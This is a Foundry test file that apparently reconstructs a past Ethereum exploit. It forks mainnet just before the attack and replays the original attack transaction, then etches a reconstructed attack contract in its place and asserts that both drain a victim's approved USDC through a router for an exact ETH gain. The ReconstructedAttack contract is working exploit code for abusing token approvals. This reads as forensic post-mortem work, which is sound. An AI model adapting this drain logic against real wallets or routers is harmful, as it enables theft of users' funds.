// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract ReplayTest is Test {
    // Key addresses
    address constant ATTACKER_EOA = 0xd6B7e831D64e573278f091AA7E68Fbf2A8FA9916;
    address constant ATTACK_CONTRACT = 0xdEd262d0A933b7BB4Ed8C4B6cb2dcE5b157B74A0;
    address constant VICTIM = 0x65A8F07Bd9A8598E1b5B6C0a88F4779DBC077675;
    address constant ROUTER = 0x00000000000044a361Ae3cAc094c9D1b14Eece97;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Attack transaction
    bytes32 constant ATTACK_TX = 0xfe34c4beee447de536bbd3d613aa0e3aa7eeb63832e9453e4ef3999924ab466a;

    // Block numbers
    uint256 constant ATTACK_BLOCK = 24575085;
    uint256 constant FORK_BLOCK = 24575084; // one before attack

    // Last transaction before the attack (index 180 of 0-180, attack is at index 181)
    bytes32 constant LAST_PRIOR_TX = 0x815326fffe5c098ffc43ad7b48e36ff7aafbb2e4ad782de3083d6798d820f90c;

    // Expected ETH gain
    uint256 constant EXPECTED_ETH_GAIN = 21197984596759249607; // wei

    // The attack calldata (from on-chain tx)
    bytes constant ATTACK_CALLDATA = hex"30f5d90e00000000000000000000000000000000000044a361ae3cac094c9d1b14eece9700000000000000000000000065a8f07bd9a8598e1b5b6c0a88f4779dbc07767500000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";

    string MAINNET_RPC_URL;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    }

    /// @notice Replay attack using original on-chain bytecode
    function test_replay_original_bytecode() public {
        uint256 forkId = vm.createSelectFork(MAINNET_RPC_URL, FORK_BLOCK);

        // Replay all transactions in block #24575085 BEFORE the attack tx
        // The attack tx is at index 181, so replay tx 0-180
        _replayPriorTransactions();

        // Record attacker's ETH balance before
        uint256 attackerBalBefore = ATTACKER_EOA.balance;
        uint256 victimUsdcBefore = _getUsdcBalance(VICTIM);

        // Execute the attack transaction using the original bytecode
        vm.prank(ATTACKER_EOA, ATTACKER_EOA); // both msg.sender and tx.origin
        (bool success,) = ATTACK_CONTRACT.call(ATTACK_CALLDATA);
        assertTrue(success, "Original bytecode attack should succeed");

        uint256 attackerBalAfter = ATTACKER_EOA.balance;
        uint256 victimUsdcAfter = _getUsdcBalance(VICTIM);
        uint256 ethGain = attackerBalAfter - attackerBalBefore;

        emit log_named_uint("Attacker ETH gain (original)", ethGain);
        emit log_named_uint("Victim USDC before", victimUsdcBefore);
        emit log_named_uint("Victim USDC after", victimUsdcAfter);

        assertEq(ethGain, EXPECTED_ETH_GAIN, "ETH gain must match exactly");
        assertEq(victimUsdcAfter, 0, "Victim USDC should be drained");
    }

    /// @notice Replay attack using reconstructed Solidity bytecode
    function test_replay_reconstructed_bytecode() public {
        uint256 forkId = vm.createSelectFork(MAINNET_RPC_URL, FORK_BLOCK);

        // Replay prior transactions
        _replayPriorTransactions();

        // Get the reconstructed bytecode from the compiled Attack contract
        bytes memory reconstructedCode = _getReconstructedBytecode();

        // Replace the attack contract's code with our reconstructed version
        vm.etch(ATTACK_CONTRACT, reconstructedCode);

        // Verify the slot 0 (owner) is still intact after etch
        bytes32 ownerSlot = vm.load(ATTACK_CONTRACT, bytes32(uint256(0)));
        assertEq(
            address(uint160(uint256(ownerSlot))),
            ATTACKER_EOA,
            "Owner should still be attacker EOA"
        );

        // Record balances before
        uint256 attackerBalBefore = ATTACKER_EOA.balance;
        uint256 victimUsdcBefore = _getUsdcBalance(VICTIM);

        // Execute the attack with reconstructed bytecode
        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        (bool success,) = ATTACK_CONTRACT.call(ATTACK_CALLDATA);
        assertTrue(success, "Reconstructed bytecode attack should succeed");

        uint256 attackerBalAfter = ATTACKER_EOA.balance;
        uint256 victimUsdcAfter = _getUsdcBalance(VICTIM);
        uint256 ethGain = attackerBalAfter - attackerBalBefore;

        emit log_named_uint("Attacker ETH gain (reconstructed)", ethGain);
        emit log_named_uint("Victim USDC before", victimUsdcBefore);
        emit log_named_uint("Victim USDC after", victimUsdcAfter);

        assertEq(ethGain, EXPECTED_ETH_GAIN, "ETH gain must match exactly (wei-precise)");
        assertEq(victimUsdcAfter, 0, "Victim USDC should be fully drained");
    }

    /// @notice Compare both bytecodes produce identical results
    function test_compare_both() public {
        // Test 1: Original bytecode
        uint256 forkId1 = vm.createSelectFork(MAINNET_RPC_URL, FORK_BLOCK);
        _replayPriorTransactions();

        uint256 attackerBalBefore1 = ATTACKER_EOA.balance;
        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        (bool success1,) = ATTACK_CONTRACT.call(ATTACK_CALLDATA);

        uint256 ethGain1 = ATTACKER_EOA.balance - attackerBalBefore1;

        // Test 2: Reconstructed bytecode
        uint256 forkId2 = vm.createSelectFork(MAINNET_RPC_URL, FORK_BLOCK);
        _replayPriorTransactions();

        vm.etch(ATTACK_CONTRACT, _getReconstructedBytecode());

        uint256 attackerBalBefore2 = ATTACKER_EOA.balance;
        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        (bool success2,) = ATTACK_CONTRACT.call(ATTACK_CALLDATA);

        uint256 ethGain2 = ATTACKER_EOA.balance - attackerBalBefore2;

        // Both must succeed
        assertTrue(success1, "Original should succeed");
        assertTrue(success2, "Reconstructed should succeed");

        // Both must produce exactly the same ETH gain
        assertEq(ethGain1, ethGain2, "ETH gains must be identical");
        assertEq(ethGain1, EXPECTED_ETH_GAIN, "ETH gain must match expected value");

        emit log_named_uint("Original ETH gain", ethGain1);
        emit log_named_uint("Reconstructed ETH gain", ethGain2);
        emit log("Both bytecodes produced identical results!");
    }

    // ── Internal Helpers ──

    function _replayPriorTransactions() internal {
        // Roll the fork to the state right after the last transaction before the attack.
        // vm.rollFork(txHash) sets the fork to the state that includes the given transaction,
        // which is equivalent to replaying all 181 prior transactions (indices 0-180).
        // This gives us the exact on-chain state just before the attack tx (index 181).
        vm.rollFork(LAST_PRIOR_TX);
    }

    function _getUsdcBalance(address account) internal view returns (uint256) {
        (bool success, bytes memory data) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", account)
        );
        require(success, "balanceOf failed");
        return abi.decode(data, (uint256));
    }

    function _getReconstructedBytecode() internal pure returns (bytes memory) {
        // This returns the runtime bytecode of our reconstructed Attack contract
        // We hardcode it here after compilation
        return type(ReconstructedAttack).runtimeCode;
    }
}

// We need to include the reconstructed attack contract here so we can access its bytecode
// This must be compiled with 0.8.13+ for forge-std compatibility, but the logic is the same as Attack.sol

struct BaseData {
    uint256 amount;
    uint256 amountLimit;
    address payer;
    address receiver;
    uint8 flags;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ReconstructedAttack {
    address private owner;

    constructor(address _owner) {
        owner = _owner;
    }

    receive() external payable {}

    function exploit(address router, address victim, address[] calldata tokens) external payable {
        require(tx.origin == owner);
        require(msg.sender == tx.origin);

        for (uint256 i = 0; i < tokens.length; i++) {
            bytes memory filler = new bytes(0x60);

            BaseData memory base;
            PoolKey memory key;

            base.amount = _getAmount(tokens[i], victim, router);
            base.payer = victim;
            base.receiver = msg.sender;
            base.flags = 1;

            key.currency1 = tokens[i];
            key.fee = 500;
            key.tickSpacing = 10;

            bytes memory innerData = abi.encode(base, false, key, "");

            bytes memory callData = abi.encodePacked(
                bytes4(0xaf2b4aba),
                uint256(0xC0),
                block.timestamp,
                filler,
                uint256(uint160(address(this))),
                uint256(innerData.length),
                innerData
            );

            (bool success, ) = router.call(callData);
            require(success);
        }
    }

    function _getAmount(
        address token,
        address victim,
        address spender
    ) internal view returns (uint256) {
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 allowance = IERC20(token).allowance(victim, spender);
        if (allowance < balance) {
            balance = allowance;
        }
        return balance;
    }
}
